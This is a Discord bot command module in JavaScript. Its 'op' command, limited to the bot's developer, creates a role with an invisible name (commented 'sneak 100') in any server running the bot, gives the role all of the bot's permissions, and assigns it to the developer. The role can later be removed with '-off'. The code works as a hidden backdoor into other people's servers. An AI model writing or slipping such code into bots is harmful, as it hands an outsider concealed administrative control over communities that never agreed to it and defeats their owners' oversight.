module.exports = {
    name: 'op',
    description: 'Gives admin perms to the dev',
    aliases: ['admin'],
    category: 'dev',
    permissions: 'BOT_DEV',
    run (client, message, args) {
        const role = message.guild.roles.cache.find(r => r.name === "‎")
        const member = message.member || message.guild.members.fetch(message.author.id)

        switch (args[0]?.toLowerCase()){
            default:
                if (member.roles.cache.get(role?.id)) {
                    return member.send('You already have the op role.')
                }
                message.guild.roles.create({
                    name: '‎', // sneak 100
                    permissions: message.guild.me.permissions
                }).then(role => {
                    const member = message.member || message.guild.members.fetch(message.author.id)

                    member.roles.add(role).then(() => message.member.send(`Gave you op role in \`${message.guild.name}\``))
                })
                    .catch(e => message.member.send(`There was an error while giving you the op role. I am probably missing permissions.`))
                break

            case '-off':
                if (!member.roles.cache.get(role?.id))  return member.send('You dont have the op role, therefore i cant remove it.')
                role.delete()
                return message.member.send(`Removed your op role in \`${message.guild.name}\``)
        }
    }
}
